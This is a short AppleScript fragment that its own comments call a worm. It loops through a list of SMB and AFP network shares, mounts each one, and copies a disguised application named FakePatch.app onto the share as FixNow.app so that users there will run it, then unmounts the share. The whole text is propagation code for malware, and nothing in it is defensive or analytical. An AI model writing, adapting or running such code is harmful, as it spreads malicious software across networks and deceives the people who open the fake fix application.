-- List of known network shares to infect
set targets to {"smb://192.168.1.5/shared", "afp://192.168.1.6/data"}

-- Loop through each share
repeat with t in targets
	-- Mount the network share to a temporary mount point
	do shell script "mkdir /Volumes/inject && mount -t smbfs " & t & " /Volumes/inject"

	-- Copy the worm to the shared Applications folder or user-accessible location
	do shell script "cp -R /Users/Shared/FakePatch.app /Volumes/inject/FixNow.app"

	-- Unmount the share after infection
	do shell script "umount /Volumes/inject"
end repeat
